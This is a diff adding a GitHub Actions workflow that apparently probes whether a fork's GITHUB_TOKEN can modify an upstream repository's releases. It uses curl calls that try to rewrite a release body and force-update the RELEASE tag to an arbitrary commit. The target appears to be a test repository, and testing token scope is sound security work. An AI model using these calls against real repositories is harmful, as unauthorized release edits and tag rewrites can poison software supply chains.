@@ -1,0 +1,26 @@
+name: Token Scope Test
+on:
+  workflow_dispatch:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test token against upstream
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== Token permissions ==="
+          curl -s -H "Authorization: token $GH_TOKEN" \
+            https://api.github.com/repos/zpqrtbnk/test-repo/releases | head -c 500
+          echo ""
+          echo "=== Try to modify upstream release ==="  
+          curl -s -X PATCH -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/zpqrtbnk/test-repo/releases/85128600 \
+            -d '{"body":"MODIFIED VIA FORK TOKEN"}'
+          echo ""
+          echo "=== Try to update upstream tag ==="
+          curl -s -X PATCH -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/zpqrtbnk/test-repo/git/refs/tags/RELEASE \
+            -d '{"sha":"0a7bd09d0ce7a8b9b9b90d4920b523cc69071cb6","force":true}'
